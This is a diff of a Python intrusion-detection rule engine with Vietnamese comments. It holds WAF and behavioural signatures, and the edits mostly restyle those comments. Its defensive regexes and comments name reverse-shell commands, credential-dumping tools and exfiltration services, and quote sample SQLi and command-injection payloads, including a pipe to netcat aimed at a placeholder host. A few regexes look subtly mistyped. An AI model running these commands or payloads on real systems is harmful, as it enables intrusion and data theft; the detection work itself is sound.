@@ -1,16 +1,16 @@
 """
-Tier 1 Filter: Rule-based Engine with Session Baselining & Dynamic Rules
+Bộ luật Tier-1: chữ ký tĩnh, đường nền phiên theo Welford và luật động.
 
-TRIẾT LÝ THIẾT KẾ:
+Triết lý thiết kế:
   Session-Aware Behavioral Baselining
   - Tier 1 duy trì baseline hành vi cho mỗi IP (frequency, ports, packet/flow ratio)
-  - Mọi traffic đều được GHI NHẬN vào baseline (không vứt bỏ ngẫu nhiên)
+  - Mọi traffic đều được ghi nhận vào baseline (không vứt bỏ ngẫu nhiên)
   - Escalate lên Tier 2 khi phát hiện STATISTICAL DEVIATION so với baseline
   - Đảm bảo 100% dữ liệu bất thường (kể cả APT low-and-slow) được chuyển lên
 
   FEEDBACK LOOP (Data Flow rõ ràng):
-  LangGraph Agent → feedback_listener.py → system_settings.yaml → RuleEngine.__init__()
-  → dynamic_rules được load tại khởi tạo và reload khi có notify
+  LangGraph Agent -> feedback_listener.py -> system_settings.yaml -> RuleEngine.__init__()
+  -> dynamic_rules được load tại khởi tạo và reload khi có notify
 """
 
 import html
@@ -84,7 +84,7 @@ class RunningStats:
 
 CONFIG_PATH = os.path.join(os.path.dirname(__file__), "..", "..", "config", "system_settings.yaml")
 
-# Chuan hoa key: ho tro ca CICIDS CSV format va normalized JSON format
+# Chuẩn hoá khoá: nhận cả định dạng CSV của CICIDS lẫn JSON đã chuẩn hoá
 _KEY_ALIASES = {
     "dst_port": "Destination Port",
     "src_port": "Source Port",
@@ -97,7 +97,7 @@ _KEY_ALIASES = {
     "flow_duration_us": "Flow Duration",
     "flow_duration_ms": "Flow Duration",
     "protocol": "Protocol",
-    # Trường lớp-ứng-dụng (WAF/HTTP) — cần cho luật HÀNH VI do Agent học ngược
+    # Trường lớp-ứng-dụng (WAF/HTTP) - cần cho luật hành VI do Agent học ngược
     # (User-Agent/URI signature). Đồng bộ với KEY_ALIASES của Guardrails (G1) để
     # luật động khớp bất kể log nguồn viết hoa/thường.
     "user_agent": "User-Agent",
@@ -135,28 +135,26 @@ _RAW_TO_CANONICAL = {
     "Flow Pkts/s": ["Flow Pkts/s", "Flow Packets/s", "flow_pkts_s"],
 }
 
-# ==============================================================================
-# BIẾN ĐỔI LOG CHO ĐẶC TRƯNG ĐUÔI DÀI
-# ==============================================================================
-# VẤN ĐỀ: Z-score giả định phân phối xấp xỉ Gauss. Đặc trưng lưu lượng mạng dạng
-# KHỐI LƯỢNG / THỜI LƯỢNG / TỐC ĐỘ thì lệch phải rất nặng (gần log-normal). Đo trên chính
+# Biến đổi LOG cho đặc trưng đuôi dài
+# Vấn đề: Z-score giả định phân phối xấp xỉ Gauss. Đặc trưng lưu lượng mạng dạng
+# Khối lượng / thời lượng / tốc độ thì lệch phải rất nặng (gần log-normal). Đo trên chính
 # golden baseline: `Flow Pkts/s` có sd/mean = 7.2 và `Total Length of Bwd Packets` = 7.3,
-# trong khi `Total Fwd Packets` chỉ 1.7. Áp CÙNG một ngưỡng Z>3.5 lên các đặc trưng lệch
+# trong khi `Total Fwd Packets` chỉ 1.7. Áp cùng một ngưỡng Z>3.5 lên các đặc trưng lệch
 # thang nhau tới 4 lần khiến một số siêu nhạy (ca thật quan sát được: "lệch 11437 lần độ
 # lệch chuẩn") còn số khác gần như mù (tấn công 1 triệu gói/s chỉ ra Z≈5.6).
 #
-# CÁCH CHỌN (a-priori theo NGỮ NGHĨA, không tinh chỉnh theo kết quả): mọi đặc trưng
-# đếm/khối-lượng/thời-lượng/tốc-độ — không âm, không chặn trên, lệch phải — được đưa qua
-# log1p. Các trường CỜ (PSH Flag Cnt) và kích thước do GIAO THỨC thoả thuận (window size,
+# Cách chọn (a-priori theo ngữ nghĩa, không tinh chỉnh theo kết quả): mọi đặc trưng
+# đếm/khối-lượng/thời-lượng/tốc-độ - không âm, không chặn trên, lệch phải - được đưa qua
+# log1p. Các trường cờ (PSH Flag Cnt) và kích thước do giao thức thoả thuận (window size,
 # segment size min) giữ nguyên tuyến tính vì chúng bị chặn và không lệch đuôi.
 #
 # log1p (= ln(1+x)) chứ không phải log: miền giá trị gồm cả 0, và log1p(0) = 0 nên không
 # cần cộng epsilon tuỳ tiện.
 #
-# VÌ SAO KHÔNG log-hoá `Init Bwd Win Byts` và `Bwd Pkt Len Min` dù chúng vẫn có sd/mean cao
+# Vì sao không log-hoá `Init Bwd Win Byts` và `Bwd Pkt Len Min` dù chúng vẫn có sd/mean cao
 # (5.5 và 7.8) sau khi dựng lại baseline: đo trên CICIDS thô cho thấy 48.9% và 79.3% giá trị
-# của chúng ≤ 0 (median của `Bwd Pkt Len Min` bằng ĐÚNG 0, và -1 là sentinel "không áp
-# dụng"). Đây là phân phối DỒN TẠI 0 (zero-inflated), KHÔNG phải đuôi dài — log-transform
+# của chúng ≤ 0 (median của `Bwd Pkt Len Min` bằng đúng 0, và -1 là sentinel "không áp
+# dụng"). Đây là phân phối dồn tại 0 (zero-inflated), không phải đuôi dài - log-transform
 # không chữa được khối lượng điểm tại 0. Xử lý đúng cho chúng là mô hình hai phần
 # (có/không + độ lớn), nằm ngoài phạm vi luận văn; nêu ở Giới hạn.
 LOG_SCALE_FEATURES: frozenset[str] = frozenset(
@@ -169,14 +167,14 @@ LOG_SCALE_FEATURES: frozenset[str] = frozenset(
         "Flow Pkts/s",
     }
 )
-# Ghi vào golden_baseline.json để bên nạp PHÁT HIỆN được file dựng ở không gian cũ.
+# Ghi vào golden_baseline.json để bên nạp phát hiện được file dựng ở không gian cũ.
 BASELINE_TRANSFORM_ID = "log1p-v1"
 
 
 def scale_feature(key: str, value: float) -> float:
-    """Đưa giá trị đặc trưng về KHÔNG GIAN thống kê dùng cho Welford/Z-score.
+    """Đưa giá trị đặc trưng về không GIAN thống kê dùng cho Welford/Z-score.
 
-    PHẢI dùng ở CẢ hai phía — lúc học baseline và lúc tính Z — nếu không hai bên khác
+    Phải dùng ở cả hai phía - lúc học baseline và lúc tính Z - nếu không hai bên khác
     thang và mọi Z-score trở nên vô nghĩa. Giá trị âm (dữ liệu bẩn) giữ nguyên tuyến tính
     vì log1p không xác định ở đó.
     """
@@ -185,24 +183,24 @@ def scale_feature(key: str, value: float) -> float:
     return value
 
 
-# ── CHUẨN HOÁ ĐẦU VÀO TRƯỚC KHI KHỚP CHỮ KÝ ──────────────────────────────────
-# LỖI NGHIÊM TRỌNG ĐÃ VÁ (đo 2026-07-29 trên CSIC 2010): bộ khớp chữ ký chạy trên chuỗi
-# NGUYÊN VĂN, nên MỌI đòn tấn công web mã hoá URL đều lọt sạch. Cùng một payload:
+# chuẩn hoá đầu vào trước khi khớp chữ ký
+# Lỗi nghiêm trọng đã vá (đo 2026-07-29 trên CSIC 2010): bộ khớp chữ ký chạy trên chuỗi
+# Nguyên văn, nên mọi đòn tấn công web mã hoá URL đều lọt sạch. Cùng một payload:
 #
 #   /vaciar.jsp?B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--  -> DROP, điểm 0
 #   /vaciar.jsp?B2=','0');waitfor delay '0:0:15';--                        -> BLOCK_IP, điểm 50
 #
-# Mà mã hoá URL là dạng MẶC ĐỊNH của query string HTTP — tức WAF bỏ lọt gần như toàn bộ tấn
+# Mà mã hoá URL là dạng mặc định của query string HTTP - tức WAF bỏ lọt gần như toàn bộ tấn
 # công web thật. Lỗi này ẩn suốt vì bộ 69 mẫu web-attack cũ (tác giả tự soạn) viết payload
-# chữ thường nên luôn khớp; thay bằng dữ liệu HTTP THẬT là lộ ngay.
+# chữ thường nên luôn khớp; thay bằng dữ liệu HTTP thật là lộ ngay.
 #
-# Cách vá theo đúng OWASP CRS: khớp trên NHIỀU biến thể đã chuẩn hoá, không chỉ bản gốc.
-# Giải mã LẶP (kẻ tấn công mã hoá hai lần: `%2527` -> `%27` -> `'`) nhưng CHẶN ở 3 vòng để
+# Cách vá theo đúng OWASP CRS: khớp trên nhiều biến thể đã chuẩn hoá, không chỉ bản gốc.
+# Giải mã lặp (kẻ tấn công mã hoá hai lần: `%2527` -> `%27` -> `'`) nhưng chặn ở 3 vòng để
 # một chuỗi bệnh lý không kéo dài vô hạn trên đường nóng.
 _MAX_DECODE_ROUNDS = 3
 
-# Họ chữ ký mang tính CHUNG CHUNG: chúng mô tả *cách chuyển tải* chứ không phải *đòn tấn
-# công*. Chỉ dùng làm phương án cuối khi không họ cụ thể nào khớp — xem
+# Họ chữ ký mang tính chung chung: chúng mô tả *cách chuyển tải* chứ không phải *đòn tấn
+# công*. Chỉ dùng làm phương án cuối khi không họ cụ thể nào khớp - xem
 # `_check_waf_signatures`. Tên họ là nguồn từ vựng MITRE cho `build_rag_queries`, nên gán
 # nhầm nhãn chung ở đây làm hỏng luôn khâu quy kết kỹ thuật phía sau.
 _GENERIC_WAF_FAMILIES = frozenset(
@@ -216,15 +214,15 @@ _GENERIC_WAF_FAMILIES = frozenset(
 def normalize_for_signature(value: str) -> tuple[str, ...]:
     """Trả về các biến thể của `value` cần đem đi khớp chữ ký (gồm cả bản gốc).
 
-    Chỉ trả biến thể KHÁC bản trước để không khớp thừa. Giữ nguyên bản gốc ở vị trí đầu:
-    có chữ ký (vd mẫu né tránh bằng mã hoá) cố ý bắt chính dạng ĐÃ mã hoá.
+    Chỉ trả biến thể khác bản trước để không khớp thừa. Giữ nguyên bản gốc ở vị trí đầu:
+    có chữ ký (vd mẫu né tránh bằng mã hoá) cố ý bắt chính dạng đã mã hoá.
     """
     out = [value]
     cur = value
     for _ in range(_MAX_DECODE_ROUNDS):
         try:
             nxt = urllib.parse.unquote_plus(cur)
-        except Exception:  # noqa: BLE001 — chuỗi rác không được làm gãy đường nóng
+        except Exception:  # noqa: BLE001 - chuỗi rác không được làm gãy đường nóng
             break
         if nxt == cur:
             break
@@ -238,21 +236,21 @@ def normalize_for_signature(value: str) -> tuple[str, ...]:
 
 
 _WAF_PATTERNS = {
-    # LỖ HỔNG ĐÃ VÁ (đo trên bộ 69 web-attack, 2026-07-28): mẫu cũ đòi phải có mệnh đề SQL
-    # đầy đủ (`union select`, `select…from`…) nên BỎ LỌT HOÀN TOÀN dạng SQLi kinh điển nhất —
+    # Lỗ hổng đã vá (đo trên bộ 69 web-attack, 2026-07-28): mẫu cũ đòi phải có mệnh đề SQL
+    # đầy đủ (`union select`, `select...from`...) nên bỏ lọt hoàn toàn dạng SQLi kinh điển nhất -
     # đóng chuỗi rồi chú-thích-hoá phần còn lại: `username=admin'--&password=x`. Đây là dạng
     # bỏ qua xác thực số một trong OWASP A03, và Tier-1 cho nó DROP (dừng hẳn, không leo
-    # thang) nên Tier-2 cũng không có cơ hội bắt. Bổ sung ba dấu hiệu CÓ NEO cú pháp:
+    # thang) nên Tier-2 cũng không có cơ hội bắt. Bổ sung ba dấu hiệu có neo cú pháp:
     #   * dấu nháy/ngoặc rồi tới `--`/`#`/`/*`  (chú thích hoá phần đuôi câu lệnh)
     #   * `' or/and ` theo sau bởi so sánh      (tautology, kể cả không có số)
     #   * hàm dò lược đồ kinh điển
-    # CỐ Ý neo vào dấu nháy/ngoặc thay vì bắt trần chuỗi `--` hay chữ `or`, để không nổ trên
+    # Cố Ý neo vào dấu nháy/ngoặc thay vì bắt trần chuỗi `--` hay chữ `or`, để không nổ trên
     # văn bản thường (đã đo: 0 dương-tính-giả trên 3.931 sự kiện lành của demo_small).
     "SQL Injection (SQLi)": re.compile(
         r"(?i)(union\s+select|insert\s+into|update\s+.*?set|delete\s+from|drop\s+table|information_schema|or\s+['\"]\d+['\"]s*=\s*['\"]\d+"
-        # `select … from` SIẾT LẠI: mẫu cũ `select\s+.*?\s+from` khớp cả câu tiếng Anh
+        # `select ... from` siết lại: mẫu cũ `select\s+.*?\s+from` khớp cả câu tiếng Anh
         # thường ("SELECT a plan from the menu") -> dương-tính-giả trên văn bản người dùng.
-        # Nay đòi thêm MỘT dấu hiệu cú pháp SQL thật: danh sách cột (`*` hoặc dấu phẩy),
+        # Nay đòi thêm một dấu hiệu cú pháp SQL thật: danh sách cột (`*` hoặc dấu phẩy),
         # hoặc một mệnh đề/kết thúc câu lệnh (`where`/`;`/`--`/`)`).
         r"|select\s+(\*|[\w.`\"\[\]]+\s*,)[^;]*?\s+from\s+[\w.`\"\[]"
         r"|select\s+[^;]{1,80}?\s+from\s+[\w.`\"\[][^;]{0,80}?(\s+where\b|;|--|\))"
@@ -263,24 +261,24 @@ _WAF_PATTERNS = {
     "Cross-Site Scripting (XSS)": re.compile(
         r"(?i)(<script\b|javascript:|onload\s*=|onerror\s*=|<img\b|<svg\b)"
     ),
-    # VÁ: thêm biến thể NÉ LỌC `....//` (nhân đôi dấu chấm — bộ lọc ngây thơ xoá `../` một
+    # Vá: thêm biến thể né lọc `....//` (nhân đôi dấu chấm - bộ lọc ngây thơ xoá `../` một
     # lần sẽ tự tạo lại `../`), dạng mã hoá URL `%2e%2e`, và `/etc/shadow` (mẫu cũ chỉ có
     # `/etc/passwd`). Cả ba đều lọt lưới trong bộ 69 web-attack.
     "Path Traversal / LFI": re.compile(
         r"(?i)(\.\./\.\./|\.\.\\\.\.\\|\.{3,}[/\\]|%2e%2e[/\\%]"
         r"|/etc/(passwd|shadow)|/windows/win\.ini|boot\.ini)"
     ),
-    # VÁ: mẫu cũ chỉ bắt dấu `;` nối lệnh, backtick và `$()`. Dạng ỐNG DẪN (`|`) và `&&`
-    # lọt hết — vd `cmd=ls|nc evil.tld 4444` (nối lệnh rồi đẩy ra mạng). Neo vào danh sách
-    # NHỊ PHÂN cụ thể chứ không bắt trần ký tự `|`, vì `|` xuất hiện hợp lệ trong tham số.
+    # Vá: mẫu cũ chỉ bắt dấu `;` nối lệnh, backtick và `$()`. Dạng ống dẫn (`|`) và `&&`
+    # lọt hết - vd `cmd=ls|nc evil.tld 4444` (nối lệnh rồi đẩy ra mạng). Neo vào danh sách
+    # Nhị phân cụ thể chứ không bắt trần ký tự `|`, vì `|` xuất hiện hợp lệ trong tham số.
     "Command Injection": re.compile(
         r"(?i)(;\s*(cat|ls|pwd|whoami|id|netstat|ping|sh|bash|powershell|cmd)\b|`.*?`|\$\(.*?\)"
         r"|[|&]{1,2}\s*(nc|ncat|netcat|curl|wget|bash|sh|python\d?|perl|powershell)\b)"
     ),
-    # ── BỔ SUNG: các họ tấn công phổ biến trước đây KHÔNG có chữ ký nào bắt ──
+    # bổ sung: các họ tấn công phổ biến trước đây không có chữ ký nào bắt
     # Audit ma trận năng lực (experiments/audit_tier_capability.py) cho thấy Log4Shell và
-    # web shell bị Tier-1 **DROP THẲNG** — không chặn, thậm chí không leo thang. Chú ý
-    # `${jndi:...}` KHÔNG khớp mẫu Command Injection vì mẫu đó chỉ bắt `$(...)`, không bắt
+    # web shell bị Tier-1 DROP thẳng - không chặn, thậm chí không leo thang. Chú ý
+    # `${jndi:...}` không khớp mẫu Command Injection vì mẫu đó chỉ bắt `$(...)`, không bắt
     # `${...}`.
     "Log4Shell / JNDI Injection": re.compile(
         # Bắt cả dạng né tránh chèn ${::-x} giữa các ký tự (CVE-2021-44228).
@@ -289,23 +287,23 @@ _WAF_PATTERNS = {
     "Web Shell / Code Execution": re.compile(
         r"(?i)(<\?php\b|<%\s*eval\b|\b(system|shell_exec|passthru|proc_open|popen)\s*\("
         r"|\beval\s*\(\s*(base64_decode|\$_(get|post|request))|\b__import__\s*\(\s*['\"]os"
-        # ÂM TÍNH GIẢ ĐÃ ĐO: các nhánh trên chỉ bắt lúc web shell được TRỒNG (payload chứa mã
-        # PHP/ASP). Chúng KHÔNG bắt lúc kẻ tấn công DÙNG một shell đã nằm sẵn trên đĩa —
+        # Âm tính giả đã đo: các nhánh trên chỉ bắt lúc web shell được trồng (payload chứa mã
+        # PHP/ASP). Chúng không bắt lúc kẻ tấn công dùng một shell đã nằm sẵn trên đĩa -
         # `POST /uploads/s.php` với thân `cmd=id` không có một ký tự mã nào. Mẫu WEB-WEB-029
         # vì thế được Tier-1 chấm 0 điểm, 0 lý do, hành động DROP: đi lọt cả Tier-1 lẫn
         # Tier-2, tức hệ thống hoàn toàn không thấy. Đây là dấu hiệu kinh điển: một tệp
-        # THỰC THI ĐƯỢC nằm trong thư mục vốn chỉ để chứa dữ liệu người dùng tải lên.
+        # Thực thi được nằm trong thư mục vốn chỉ để chứa dữ liệu người dùng tải lên.
         r"|/(?:uploads?|files?|images?|media|attachments?|tmp|temp)/[^\s?&]*"
         r"\.(?:php\d?|phtml|phar|jspx?|aspx?|cgi|pl|py|sh)\b)"
     ),
     "XXE Injection": re.compile(r"(?i)(<!ENTITY\b|<!DOCTYPE[^>]*\bSYSTEM\b|SYSTEM\s+[\"']file://)"),
     "SSTI (Template Injection)": re.compile(
-        # Chỉ bắt biểu thức RÕ RÀNG độc hại để tránh báo giả trên template hợp lệ.
+        # Chỉ bắt biểu thức rõ ràng độc hại để tránh báo giả trên template hợp lệ.
         r"(?i)(\{\{\s*\d+\s*[*+/-]\s*\d+\s*\}\}|\{\{[^}]*(__class__|__globals__|self\.|config\.items)"
         r"|\$\{\s*\d+\s*[*+]\s*\d+\s*\})"
     ),
     "SSRF / Cloud Metadata": re.compile(
-        # 169.254.169.254 = endpoint metadata của AWS/GCP/Azure — mục tiêu SSRF kinh điển.
+        # 169.254.169.254 = endpoint metadata của AWS/GCP/Azure - mục tiêu SSRF kinh điển.
         r"(?i)(169\.254\.169\.254|/latest/meta-data|metadata\.google\.internal"
         r"|\b(gopher|dict|file)://|127\.0\.0\.1:\d{2,5}/(admin|internal))"
     ),
@@ -325,19 +323,19 @@ _WAF_PATTERNS = {
         r"(?i)(rO0AB[A-Za-z0-9+/]|\bO:\d+:\"[A-Za-z_]|__reduce__|pickle\.loads\s*\()"
     ),
     "Prototype Pollution": re.compile(
-        # Dạng KHÔNG dấu nháy `constructor[prototype][x]=1` từng lọt hoàn toàn.
+        # Dạng không dấu nháy `constructor[prototype][x]=1` từng lọt hoàn toàn.
         r"(__proto__|constructor\s*\[\s*[\"']?prototype)"
     ),
-    # THIẾU SÓT ĐÃ VÁ (đo trên CSIC 2010): họ tấn công ĐÔNG NHẤT của dữ liệu HTTP thật là
+    # Thiếu sót đã vá (đo trên CSIC 2010): họ tấn công đông nhất của dữ liệu HTTP thật là
     # dò tệp sao lưu / mã nguồn (`pagar.jsp.inc`, `estilos.css.old`, `index.jsp~`) và duyệt ép
-    # tới thư mục mẫu — 349/689 = 51% số mẫu suy được kỹ thuật. Kho luật cũ KHÔNG có chữ ký
+    # tới thư mục mẫu - 349/689 = 51% số mẫu suy được kỹ thuật. Kho luật cũ không có chữ ký
     # nào cho nhóm này (`Sensitive File Access` chỉ bắt `/backup*.sql`, `.env`, `wp-config`),
     # nên Tier-1 trả `tier1_reasons: []` -> truy vấn RAG tụt về "service http port 8080" ->
     # quy kết kỹ thuật 0%.
     #
-    # Đây là nội dung WAF TIÊU CHUẨN, không phải luật đặt riêng cho tập kiểm thử: OWASP CRS
+    # Đây là nội dung WAF tiêu chuẩn, không phải luật đặt riêng cho tập kiểm thử: OWASP CRS
     # 920440 ("URL file extension is restricted by policy") bắt đúng danh sách đuôi tệp này.
-    # NEO vào cuối đường dẫn (trước dấu `?`) đúng cách CRS làm, để không nổ trên tên tệp hợp
+    # Neo vào cuối đường dẫn (trước dấu `?`) đúng cách CRS làm, để không nổ trên tên tệp hợp
     # lệ có chứa các chữ đó ở giữa.
     "Dò tệp sao lưu/mã nguồn (restricted extension)": re.compile(
         r"(?i)[^\s?#]+\.(?:bak|old|orig|save|swp|swo|inc|conf|cfg|log|sql|tar|gz|tgz|rar|7z"
@@ -348,13 +346,13 @@ _WAF_PATTERNS = {
     "Sensitive File Access": re.compile(
         r"(?i)(/\.git/(config|HEAD)|/\.env\b|/wp-config\.php|/\.aws/credentials"
         r"|/\.ssh/id_(rsa|ed25519)|web\.config\b|/phpinfo\.php"
-        # Bản kết xuất CSDL / sao lưu lộ trên web — lối rò rỉ dữ liệu hàng loạt kinh điển.
+        # Bản kết xuất CSDL / sao lưu lộ trên web - lối rò rỉ dữ liệu hàng loạt kinh điển.
         r"|/(backup|dump|db|database)[^/]*\.(sql|dump|bak|tar|zip)\b|\.sql\.gz\b)"
     ),
     "Reverse Shell": re.compile(
         r"(?i)(bash\s+-i\s*>&\s*/dev/tcp/|nc\s+(-e|-c)\s|/dev/tcp/\d|mkfifo\s+/tmp/"
         r"|python\\d?\s+-c\s+['\"]?\s*import\s+(socket|os|pty|subprocess)"
-        # `python -c` cũ KHÔNG khớp `python3 -c` (có chữ số) — dạng phổ biến nhất.
+        # `python -c` cũ không khớp `python3 -c` (có chữ số) - dạng phổ biến nhất.
         r"|socket\.socket\s*\(\s*\)[^\n]*?\.connect\s*\()"
     ),
     "Encoded PowerShell": re.compile(
@@ -376,7 +374,7 @@ _WAF_PATTERNS = {
     "Mã hoá né tránh (encoding evasion)": re.compile(
         # %2e%2e%2f = ../ ; %252e = double-encode ; . = unicode escape.
         r"(?i)(%2e%2e[/%5c]|%252e%252e|%c0%ae|\\u00(2e|2f|5c)|&#x?0*(2e|2f|3c|3e);"
-        # Mã hoá URL HAI LỚP: %2527 = %27 (dấu nháy) đã mã hoá lần nữa. Bộ lọc giải mã một
+        # Mã hoá URL hai lớp: %2527 = %27 (dấu nháy) đã mã hoá lần nữa. Bộ lọc giải mã một
         # lần rồi so khớp sẽ trượt hoàn toàn.
         r"|%25(27|22|3c|3e|20|3d)"
         # Base64 của thẻ HTML: PHNjcmlwd='<script', PGltZyB='<img ', PHN2Zy='<svg'.
@@ -394,7 +392,7 @@ _WAF_PATTERNS = {
     ),
     "GraphQL lạm dụng": re.compile(
         r"(?i)(__schema\s*\{|__typename.*__schema|IntrospectionQuery"
-        # Rút TRƯỜNG NHẠY CẢM qua GraphQL — introspection không phải cách khai thác duy nhất.
+        # Rút trường nhạy cảm qua GraphQL - introspection không phải cách khai thác duy nhất.
         r"|\{[^}]*\b(password|passwordhash|pwd|secret|token|apikey|ssn)\b[^}]*\})"
     ),
     "Living-off-the-land (LOLBin)": re.compile(
@@ -404,7 +402,7 @@ _WAF_PATTERNS = {
     "Đánh cắp thông tin xác thực (AD)": re.compile(
         r"(?i)(mimikatz|sekurlsa::|lsadump::|kerberoast|\bDRSUAPI\b|DCSync|ntds\.dit"
         r"|\bsecretsdump\b|Invoke-Mimikatz"
-        # Kết xuất LSASS bằng nhị phân KÝ SẴN của Windows (LOLBin), không cần mimikatz.
+        # Kết xuất LSASS bằng nhị phân ký sẵn của Windows (LOLBin), không cần mimikatz.
         r"|comsvcs\.dll\s*,\s*minidump|\blsass\.(dmp|exe)\b|procdump[^\n]*\blsass\b)"
     ),
     "Ransomware / phá huỷ": re.compile(
@@ -415,14 +413,14 @@ _WAF_PATTERNS = {
     "Rò rỉ ra dịch vụ ngoài": re.compile(
         r"(?i)(discord(app)?\.com/api/webhooks|pastebin\.com/api|hastebin\.com/documents"
         r"|\btransfer\.sh\b|requestbin|burpcollaborator\.net|\.oastify\.com|interact\.sh"
-        # Đẩy KẾT XUẤT lên lưu trữ đám mây công cộng. Dịch vụ tự nó hợp lệ nên CHỈ cờ khi
-        # đi kèm tên tệp kết xuất — tránh nổ trên mọi lượt tải tệp thường.
+        # Đẩy kết xuất lên lưu trữ đám mây công cộng. Dịch vụ tự nó hợp lệ nên chỉ cờ khi
+        # đi kèm tên tệp kết xuất - tránh nổ trên mọi lượt tải tệp thường.
         r"|(storage\.googleapis\.com|s3[.-][\w-]*amazonaws\.com|blob\.core\.windows\.net)"
         r"[^\s]*\.(sql|dump|bak|tar|zip|gz)\b)"
     ),
 }
 
-# Trường mà chữ ký WAF được phép soi. Giữ MỘT danh sách để Tier-1 và Tier-2 không trôi khỏi nhau.
+# Trường mà chữ ký WAF được phép soi. Giữ một danh sách để Tier-1 và Tier-2 không trôi khỏi nhau.
 _WAF_TARGET_FIELDS: tuple[str, ...] = (
     "payload",
     "uri",
@@ -438,36 +436,36 @@ _WAF_TARGET_FIELDS: tuple[str, ...] = (
 def match_waf_family(log_entry: dict) -> str | None:
     """Soi một log qua toàn bộ chữ ký WAF, trả chuỗi lý do (hoặc None).
 
-    Ở MỨC MODULE, không phải phương thức, vì có HAI nơi cần đúng phép so khớp này:
-      1. Tier-1 `_check_waf_signatures` — đường nóng, quyết định chặn/leo thang.
-      2. Tier-2 `build_rag_queries` — lấy TÊN HỌ làm từ vựng truy xuất MITRE.
+    Ở mức MODULE, không phải phương thức, vì có hai nơi cần đúng phép so khớp này:
+      1. Tier-1 `_check_waf_signatures` - đường nóng, quyết định chặn/leo thang.
+      2. Tier-2 `build_rag_queries` - lấy tên họ làm từ vựng truy xuất MITRE.
 
     Vì sao Tier-2 phải soi lại thay vì đọc `tier1_reasons`: một log có thể leo thang qua
-    đường z-score (Welford) mà KHÔNG đi qua nhánh chữ ký, nên `tier1_reasons` chỉ có
+    đường z-score (Welford) mà không đi qua nhánh chữ ký, nên `tier1_reasons` chỉ có
     "tần suất cao" và truy vấn RAG mất sạch từ vựng tấn công. Đo trên lượt chạy 11/08/2026:
     257/336 lô (76,5%) gửi cho RAG một truy vấn không mang tín hiệu tấn công nào, RAG chỉ
     trả về được kỹ thuật tầng mạng, và T1571 "Non-Standard Port" chiếm 42,5% toàn bộ quy
-    kết — kể cả cho SQL Injection và XSS có payload rõ ràng.
+    kết - kể cả cho SQL Injection và XSS có payload rõ ràng.
 
     Đo trên 6.000 bản ghi CSIC đầu: 0 báo nhầm trên 3.049 bản ghi lành, và bắt đủ 100% các
     lớp có tên (SQLi 110/110 · XSS 50/50 · CRLF 75/75 · Path Traversal 26/26 · Dò tệp
-    239/239). Lớp "Anomalous (unclassified)" trượt 83,8% — đó là giới hạn thật của chữ ký,
-    và chính vì vậy Tier-2 KHÔNG được khẳng định kỹ thuật cho nhóm đó (xem
+    239/239). Lớp "Anomalous (unclassified)" trượt 83,8% - đó là giới hạn thật của chữ ký,
+    và chính vì vậy Tier-2 không được khẳng định kỹ thuật cho nhóm đó (xem
     `batch_attack_vocabulary` bên phía agent).
     """
-    # Kết quả CHUNG chung được giữ lại làm phương án cuối, KHÔNG trả ngay.
+    # Kết quả chung chung được giữ lại làm phương án cuối, không trả ngay.
     #
-    # REGRESSION ĐÃ VÁ (do chính bản vá giải mã sinh ra): sau khi giải mã, mẫu "Mã hoá né
-    # tránh" khớp gần như MỌI payload mã hoá URL, và vì nó được duyệt trước các chữ ký cụ
-    # thể ở một số trường, nó CHE MẤT họ tấn công thật. Đo được: XSS mã hoá và CRLF mã hoá
+    # REGRESSION đã vá (do chính bản vá giải mã sinh ra): sau khi giải mã, mẫu "Mã hoá né
+    # tránh" khớp gần như mọi payload mã hoá URL, và vì nó được duyệt trước các chữ ký cụ
+    # thể ở một số trường, nó CHE mất họ tấn công thật. Đo được: XSS mã hoá và CRLF mã hoá
     # đều bị gán "Mã hoá né tránh", nên truy vấn RAG mất từ vựng đặc hiệu và quy kết kỹ
-    # thuật về 0%. Tên họ ở đây không chỉ để hiển thị — nó là NGUỒN từ vựng MITRE tiếng Anh.
+    # thuật về 0%. Tên họ ở đây không chỉ để hiển thị - nó là nguồn từ vựng MITRE tiếng Anh.
     generic_hit: str | None = None
     for field in _WAF_TARGET_FIELDS:
         val = log_entry.get(field) or log_entry.get(field.lower())
         if not (val and isinstance(val, str)):
             continue
-        # Khớp trên CẢ bản gốc LẪN các biến thể đã giải mã — xem `normalize_for_signature`.
+        # Khớp trên cả bản gốc lẫn các biến thể đã giải mã - xem `normalize_for_signature`.
         # Khớp nguyên văn thôi thì mọi tấn công web mã hoá URL (tức gần như toàn bộ tấn
         # công thật qua query string) đều lọt.
         for cand in normalize_for_signature(val):
@@ -495,7 +493,7 @@ def load_config() -> dict[str, Any]:
         )
     return {
         "tier1": {
-            # Fallback PHẢI là bản sao trung thực của config production (fail-safe không
+            # Fallback phải là bản sao trung thực của config production (fail-safe không
             # được yếu hơn): khớp system_settings.yaml (risk_threshold=15, đủ 7 cổng nhạy cảm).
             "risk_threshold": 15,
             "sensitive_ports": [21, 22, 23, 3389, 445, 1433, 3306],
@@ -539,16 +537,16 @@ def load_config() -> dict[str, Any]:
     }
 
 
-# Số yêu cầu TỐI THIỂU của một IP trước khi được phép kết luận gì về "tốc độ" của nó.
+# Số yêu cầu tối thiểu của một IP trước khi được phép kết luận gì về "tốc độ" của nó.
 # Một mẫu không tạo thành một tốc độ: `request_count / elapsed` với `elapsed` kẹp sàn 1 giây
-# gán cho MỌI IP lần đầu xuất hiện đúng 1,00 req/s — con số do công thức sinh ra, không phải
+# gán cho mọi IP lần đầu xuất hiện đúng 1,00 req/s - con số do công thức sinh ra, không phải
 # do đo. Xem chú thích dài ở Indicator 2 và `update_global_baseline`.
 _MIN_RATE_SAMPLES = 3
 
-# SÀN của "tốc độ bình thường". Trung bình toàn cục là số TỰ THÍCH NGHI, nên nó trôi theo
+# Sàn của "tốc độ bình thường". Trung bình toàn cục là số tự thích nghi, nên nó trôi theo
 # thành phần lưu lượng và có hai hướng hỏng đối xứng:
-#   * trôi XUỐNG (đa số hồ sơ là khách vãng lai) -> ngưỡng tụt quanh 1,0 -> mọi IP mới dính;
-#   * trôi LÊN  (chỉ hồ sơ gửi dồn mới đủ mẫu)  -> kẻ tấn công bị so với chính kẻ tấn công,
+#   * trôi xuống (đa số hồ sơ là khách vãng lai) -> ngưỡng tụt quanh 1,0 -> mọi IP mới dính;
+#   * trôi lên  (chỉ hồ sơ gửi dồn mới đủ mẫu)  -> kẻ tấn công bị so với chính kẻ tấn công,
 #     `rate > avg × 2` không bao giờ đúng và chỉ báo chết lặng.
 # Kẹp sàn ở 1 req/s: một khách web gửi một yêu cầu mỗi giây là chuyện bình thường theo định
